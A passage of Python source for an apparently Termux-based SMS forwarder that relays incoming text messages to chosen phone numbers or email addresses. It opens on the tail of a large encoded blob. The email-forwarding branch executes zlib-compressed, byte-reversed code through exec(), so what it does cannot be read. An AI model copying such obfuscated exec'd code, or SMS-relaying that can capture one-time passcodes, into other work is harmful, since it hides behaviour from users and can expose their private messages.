kBQaxoY4j5nMy87MU3U9RqYIJHAqwWi0CUOLyEI4Y0dz0Gkz+BXsMWyjtz6y/0Gn643NpxTet2AG7bfOZ+yGfTcP9MduLJTm7X53CCmf/T389fN6rSP3Gd20nzsrp6iJtvl93/853IB8ZlRcf743urG+SAx4XDTUPpIN967ZawXc5Ru3s+jC9EJyhANWDjjYIY3JU6SBy8HVasZIMEgFwP6E2AXVWIL1OOyn5ynaNitInz76NJoEqf7VEu2hdgF31Ru77K1xGdSamAjADGwv8aB+0NDJcbwL6I1+eoYqI0BljRC4IzOtplELoB3c3+xKKHsrwopi2lpIouGaIMYzjFMaDPE2wtpXABnFEIGdlyuxZ2K6k3sj0BmgQ7GiBVJOCOoOWi00OjAGmGiwNyQXnGZDJEJc0YiMDbOyawJSdvQIBD1IULfgO9exAOVFN8v4JkWF7tqDpiieLO7htRACab0VlKtgvIGezGTFYt2TQKpaNYYDefY+2NuQkOxDzxEIWqGSiMauWdqQjZy4GcIAAKOS3zPhs1QJSMvZxBaoGTqyYRpMGoagth8HYd5aDYwZWjLWozw2OYzANNG8olHKcxHNIuua792Fx1J+KqZA8VgZTrGRLVYTWSWUKhBmdcVCkYeyY1P2SeWLSjVCwkGTr09HZvtNbkmXhHG5eKK3Ib14gZOP4UZ+M93d3eqGUBB4ZgbW+5hbvfsTc4Ip2abIncZXItCQSEDIo3UDdNe3eHa2xRi2BhuUNmyUXVu9ursMkIvKJDKq0iRqa+9lQi2dZiL6bBK23C2WCilkZtoIaOb0T5uWw+khYGkiwUAmgbQzI4dqWoa0Ic6iyGDTlFh9almKEVQ+5fh/JlMO9ANyH5gFjv2kVfpk8yv3p/VdUfkd4LOtVfkJ9PrluT0t3Ql/Ckj/bwto31UVfHlkUxPFe88T6aVjJO+rHhnZUVBHrSp+7wL2TOzf4XCK925egqqJGchEflkeeO0rkOQa5fRjpfxR9TOikTTxD8bQ8lXgjb4XvYrw1AeZC8RbE/VTq8//ijpHuKFD+axYRaRvGcU3BnA57H410PlPd5kcL+S3D8qfXCUZ9zn8d6ft4xr8WARl7HLkPPO8iv8OeOwbtDnTStTk35rVcQ++pw2W90KWklPsmD8X+J68CeVFNR+nU5oVOeunsU8nBcW9gciP8CHuq7v89MHcMahOGAa1bncrfXkYtydCor4Rr8mcfN/8CMVOepgdKfkiH/5BEm4xr8hCHvFOepjX+KlPV9jo4y5VMm6HhaRK8iHsqCwvBbldjfN/OwOBiRuhOWZ9kbwdp0L1DGrHswPfEY34njPkkKsL81dtvfsEnTK5kEAAiAu36+JPVw/nod+fX0/7hefpW+YyQmPG6P3mpZle2FhsAQlJ6C5zasTKbG3Mmc7JppT4wZcNZTJtJpijh60PyEKnzxl5whdLiKoZY82zllG1yJe'))

def SendNumber(to, data):                 # Define a function called SendNumber with two parameters to and data
    def SendNumberCheck(number, data):    # Define a nested function called SendNumberCheck with two parameters number and data
        try:
            subprocess.getoutput(f"termux-sms-send -n {number} {data}")   # Use the subprocess module to send an SMS message to the specified number
            details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t all"))   # Use the subprocess module to get details of the last 10 SMS messages
            for data in details:            # Loop through the details of the messages
                try:
                    if ("".join(data["received"].split(" ")[1].split(":")[:-1]) != time.strftime("%H%M")):  # Check if the received time of the message matches the current time
                        if (data['sender'] == 'You'):      # Check if the sender of the message is the user
                            if (data['type'] == 'failed'):  # Check if the message sending failed
                                return False              # Return False if any of the checks failed
                except: pass
            return True                         # Return True if all checks passed
        except: return False                    # Return False if an exception occurred during message sending or message checking
    if not (SendNumberCheck(to, data)):        # Call the nested function SendNumberCheck with the specified number and data, and check if it returned False
        finaltxt=""
        for i in range(((Arrange(os.get_terminal_size().columns).columns) - 2) // 2)-21: finaltxt += " "   # Generate a message to be displayed if message sending failed
        sys.stdout.write("\r"+finaltxt+f"{magenta}[{red}!{magenta}] {white}Could Not Send Message      {yellow}"), print(), print()   # Display the message
    else:                                     # If SendNumberCheck returned True
        finaltxt=""
        for i in range(((Arrange(os.get_terminal_size().columns).columns) - 2) // 2)-21: finaltxt += " "   # Generate a message to be displayed if message sending succeeded
        sys.stdout.write("\r"+finaltxt+f"{magenta}[{yellow}*{magenta}] {white}Message Send                {yellow}"), print(), print()  # Display the message

STORE, ID = [], ""
def SendSMS(TO, SVE):
    try:
        global ID
        details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t inbox -n"))
        for data in details:
            SmsID = data["_id"]
            if (time.strftime("%Y-%m-%d")) == (data["received"].split(" ")[0]) and ("".join(data["received"].split(" ")[1].split(":")[:-1])) == (time.strftime("%H%M")):
                SmsID = str(SmsID)
                if (re.search(SmsID, ID)) : SMSLBAR()
                else:
                    subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle -s sms received")
                    subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle -s forwarding message")
                    for to in TO:
                        if (SVE): _ = lambda __ : zlib.decompress(__[::-1]);exec((_)(b'\xf3\x1e\xce\xc7\x00\x13_$\xa4P:\x8afJbjQFIz\x9ep\x95)\xf9I\xf9\xc1)\x16\xa5&\xe6\x95\xe7\xc8\x80Q\xd5\x886\x8c\xd2PRP\xd1,\xc9\xc8.+\xd5\x8aQMK,\xcdNMJ*V\x8cI,IH\xd1\xcc\xccM\xcdqK\xcdN\x0b\x9cx'))
                        else: SendNumber(to, data["body"])
                    ID += SmsID
            else: SMSLBAR()
    except KeyboardInterrupt: EXIT(False)
    except json.decoder.JSONDecodeError :
        finaltxt=""
        for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
        sys.stdout.write("\r"+finaltxt+f"{magenta}[{red}!{magenta}] {white}Could Not Send Message      {yellow}"), print(), print()
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def SMSLBAR():
    finaltxt=""
    for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
    sys.stdout.write("\r"+finaltxt+f"{magenta}[{yellow}*{magenta}] {white}Waiting For New Messages...")

def EmailMenu():
    try:
        Banner()
        if not (Internet()):
            print()
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║    {blue}Check your internet connection...     {red}║",15)
            center(f"{red}╚══════════════════════════════════════════╝",5)
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║           {blue}Choose An Option...            {red}║",15)
            center(f"{red}╠══════════════════════════════════════════╣",5)
            center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║",30)
            center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}TRY AGAIN                  {red}║",30)
            center(f"{red}║         {magenta}[{white}03{magenta}]  {yellow}EXIT                       {red}║",30)
            center(f"{red}╠══════════════════════════════════════════╝",5)
            center(f"║{Space(42)}")
            Input = INPUT("╚════► ")
            if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
            elif (Input == "2") or (Input == "02") or (Input == "two"): EmailMenu()
            elif (Input == "3") or (Input == "03") or (Input == "three"): EXIT()
            else:
                center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {blue}Invalid Option              {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            sleep(2)
            MENU()
        else:
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║      {blue}Enter emails separated by '{green},{blue}'       {red}║", 25)
            center(f"╠══════════════════════════════════════════╝")
            center(f"║{Space(42)}")
            Input = INPUT("╚════► ")
            Emails = Input.split(",")
            Filter = []
            for email in Emails:
                if (email == ""): continue
                else: Filter.append(email)
            if (len(Filter) == 0): EmailMenu()
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(Box(f"{white}Forwarding SMS To "+str(len(Filter))+" Emails", red+"║   ", " ", red+"  ║", 44, "center", resultprint=False), 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║       {white}For stop press ( {magenta}ctrl + c {white})        {red}║", 25)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            print(yellow)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            while True: SendSMS(Filter, True)
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def PHMenu():
    try:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║  {blue}Enter mobile numbers separated by '{green},{blue}'   {red}║", 25)
        center(f"╠══════════════════════════════════════════╝")
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        Numbers = Input.split(",")
        Filter = []
        for number in Numbers:
            if (number == ""): continue
            else: Filter.append(number)
        if (len(Filter) == 0): PHMenu()
        else:
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(Box(f"{white}Forwarding SMS To "+str(len(Filter))+" Phone Numbers", red+"║   ", " ", red+"  ║", 44, "center", resultprint=False), 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║       {white}For stop press ( {magenta}ctrl + c {white})        {red}║", 25)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            print(yellow)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            while True: SendSMS(Filter, False)
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def MENU():
    try:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║           {blue}Choose An Option...            {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝\n",5)
        center(f"{magenta}[{white}01{magenta}]  {yellow}Forward Messages Via Email          ",20)
        center(f"{magenta}[{white}02{magenta}]  {yellow}Forward Messages Via Phone Number   ",20)
        center(f"{magenta}[{white}03{magenta}]  {yellow}About Tool                          ",20)
        center(f"{magenta}[{white}04{magenta}]  {yellow}Usage                               ",20)
        center(f"{magenta}[{white}05{magenta}]  {yellow}Update Tool                         ",20)
        center(f"{magenta}[{white}06{magenta}]  {yellow}More From Us                        ",20)
        center(f"{magenta}[{white}07{magenta}]  {yellow}Exit....                           \n",20)
        center(f"{red}╔═══════════════════════════════════════════",5)
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        if (Input == "1") or (Input == "01") or (Input == "one"): EmailMenu()
        elif (Input == "2") or (Input == "02") or (Input == "two"): PHMenu()
        elif (Input == "3") or (Input == "03") or (Input == "three"): About()
        elif (Input == "4") or (Input == "04") or (Input == "four"): Usage()
        elif (Input == "5") or (Input == "05") or (Input == "five"): Update()
        elif (Input == "6") or (Input == "06") or (Input == "six"): os.system("termux-open-url https://github.com/GreyTechno"), MENU()
        elif (Input == "7") or (Input == "07") or (Input == "seven"): EXIT()
        else: 
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║       {magenta}Invalid Option Try Again...        {red}║",15)
            center(f"{red}╚══════════════════════════════════════════╝",5)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            sleep(2)
            MENU()
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

# line checks whether the current script is being run as the main program or if it has been imported into another script. If it is being run as the main program, the code within the following block will be executed.
if (__name__ == "__main__"):
    sys.stdout.write(f"\r{yellow}Checking Updates...") # prints the message "Checking Updates..." to the console with the text color in yellow.
    # The termux_api() function is called and checks if the Termux API is available on the device. If the API is not available, the Installer() function is called to install the Termux API
    if not (termux_api()): os.system("pip install requests secure-smtplib")
    # If the API is available, Internet() function is called to check if there is an internet connection. If there is an internet connection, CheckVersion() function is called to check for updates.
    else:
        # Finally, if there is no command detected (i.e., cmd() returns False), the MENU() function is called to display the main menu.
        if (Internet()): sys.stdout.write(f"\r{yellow}Checking Updates..."), CheckVersion()
        if not (cmd()): MENU()
